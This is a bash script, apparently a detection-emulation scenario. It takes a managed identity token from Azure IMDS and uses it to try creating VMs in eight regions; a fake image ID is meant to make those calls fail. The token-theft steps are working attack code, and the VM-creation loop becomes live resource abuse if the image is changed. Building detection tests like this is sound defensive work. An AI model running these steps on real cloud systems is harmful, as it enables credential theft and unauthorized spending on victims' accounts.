#!/bin/bash

# Define the Azure IMDS endpoint
IMDS_IP="169.254.169.254"
AZURE_IMDS_TOKEN_URL="http://${IMDS_IP}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
AZURE_IMDS_INSTANCE_URL="http://${IMDS_IP}/metadata/instance?api-version=2021-02-01"

# Perform raw IMDS token requests to generate detection signals.
# These direct curl calls hit the Azure IMDS endpoint and are visible to runtime
# security monitoring, independently of whether they succeed or not.

# Retrieve Azure managed identity token via IMDS (unauthenticated path — triggers detection)
curl --connect-timeout 5.0 -H "Metadata: true" "${AZURE_IMDS_TOKEN_URL}" || true

# Retrieve instance metadata
curl --connect-timeout 5.0 -H "Metadata: true" "${AZURE_IMDS_INSTANCE_URL}" || true

# Check for 'jq' dependency
if ! command -v jq &> /dev/null; then
    echo "Error: 'jq' is not installed. Please install it to parse the JSON response." >&2
    exit 1
fi

# Function to retrieve a managed identity bearer token from Azure IMDS
get_azure_imds_token() {
    echo "Attempting to retrieve managed identity token from Azure IMDS..." >&2

    TOKEN_RESPONSE=$(curl -s -H "Metadata: true" "${AZURE_IMDS_TOKEN_URL}" \
        --connect-timeout 2 --max-time 5)

    if [ -z "$TOKEN_RESPONSE" ]; then
        echo "Failed to reach Azure IMDS endpoint" >&2
        return 1
    fi

    ACCESS_TOKEN=$(echo "$TOKEN_RESPONSE" | jq -r '.access_token // empty')
    if [ -z "$ACCESS_TOKEN" ] || [ "$ACCESS_TOKEN" = "null" ]; then
        echo "No access_token in IMDS response — node may not have a managed identity assigned" >&2
        return 1
    fi

    export AZURE_ACCESS_TOKEN="$ACCESS_TOKEN"

    # Also extract the subscription ID from instance metadata for later API calls
    INSTANCE_META=$(curl -s -H "Metadata: true" "${AZURE_IMDS_INSTANCE_URL}" \
        --connect-timeout 2 --max-time 5)
    export AZURE_SUBSCRIPTION_ID=$(echo "$INSTANCE_META" | jq -r '.compute.subscriptionId // empty')
    export AZURE_RESOURCE_GROUP=$(echo "$INSTANCE_META" | jq -r '.compute.resourceGroupName // empty')
    export AZURE_LOCATION=$(echo "$INSTANCE_META" | jq -r '.compute.location // empty')

    echo "Successfully retrieved managed identity token from Azure IMDS" >&2
    echo "Subscription: ${AZURE_SUBSCRIPTION_ID:-unknown}  Location: ${AZURE_LOCATION:-unknown}" >&2
    return 0
}

# Try to get a token from Azure IMDS
if ! get_azure_imds_token; then
    echo "Error: Could not retrieve managed identity token from Azure IMDS."
    echo "Ensure the node has a managed identity assigned and the pod uses Azure Workload Identity."
    exit 1
fi

VM_SIZE="Standard_D4s_v3"
# Attempt to create VMs across multiple Azure regions to demonstrate resource abuse.
# We use a non-existent image reference so the call will fail after generating an
# Activity Log entry that Datadog Cloud SIEM / Microsoft Defender can detect.
LOCATIONS=('eastus' 'westeurope' 'eastasia' 'australiaeast' 'brazilsouth' 'canadacentral' 'japaneast' 'southeastasia')
FAKE_IMAGE_ID="/subscriptions/${AZURE_SUBSCRIPTION_ID}/resourceGroups/nonexistent/providers/Microsoft.Compute/images/nonexistent-image"

echo "Attempting to create Azure VMs with size ${VM_SIZE} using stolen managed identity token..."
echo ""

# Check for Azure CLI
if ! command -v az &> /dev/null; then
    echo "Azure CLI is not installed. Falling back to ARM REST API calls..."

    # Use the raw ARM REST API so the scenario works without az CLI installed in the pod
    ARM_BASE="https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}"

    for LOCATION in "${LOCATIONS[@]}"; do
        echo "Attempting ARM VM create call targeting ${LOCATION}..."
        RG_NAME="playground-abuse-${LOCATION}"
        VM_NAME="abuse-vm-${LOCATION}"

        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
            -X PUT \
            -H "Authorization: Bearer ${AZURE_ACCESS_TOKEN}" \
            -H "Content-Type: application/json" \
            --connect-timeout 5 --max-time 10 \
            "${ARM_BASE}/resourceGroups/${RG_NAME}/providers/Microsoft.Compute/virtualMachines/${VM_NAME}?api-version=2023-09-01" \
            -d "{
              \"location\": \"${LOCATION}\",
              \"properties\": {
                \"hardwareProfile\": {\"vmSize\": \"${VM_SIZE}\"},
                \"storageProfile\": {
                  \"imageReference\": {\"id\": \"${FAKE_IMAGE_ID}\"}
                },
                \"osProfile\": {
                  \"computerName\": \"${VM_NAME}\",
                  \"adminUsername\": \"azureuser\",
                  \"adminPassword\": \"Placeholder!1\"
                },
                \"networkProfile\": {
                  \"networkInterfaces\": []
                }
              }
            }")

        echo "ARM response for ${LOCATION}: HTTP ${RESPONSE}"
    done
    exit 0
fi

# Loop through Azure regions using az CLI
for LOCATION in "${LOCATIONS[@]}"; do
    echo "Attempting to create ${VM_SIZE} VM in ${LOCATION}..."

    LAUNCH_OUTPUT=$(az vm create \
        --resource-group "${AZURE_RESOURCE_GROUP:-playground}" \
        --name "abuse-vm-${LOCATION}" \
        --image "${FAKE_IMAGE_ID}" \
        --size "${VM_SIZE}" \
        --location "${LOCATION}" \
        --no-wait \
        2>&1)

    if [ $? -eq 0 ]; then
        echo "VM create request submitted in ${LOCATION} (async)"
    else
        ERROR=$(echo "$LAUNCH_OUTPUT" | grep -oP '(?<="code": ")[^"]+' | head -1)
        if [ -n "$ERROR" ]; then
            echo "VM create failed in ${LOCATION}: ${ERROR}"
        else
            echo "Error creating VM in ${LOCATION}. Check output for details."
        fi
    fi
done
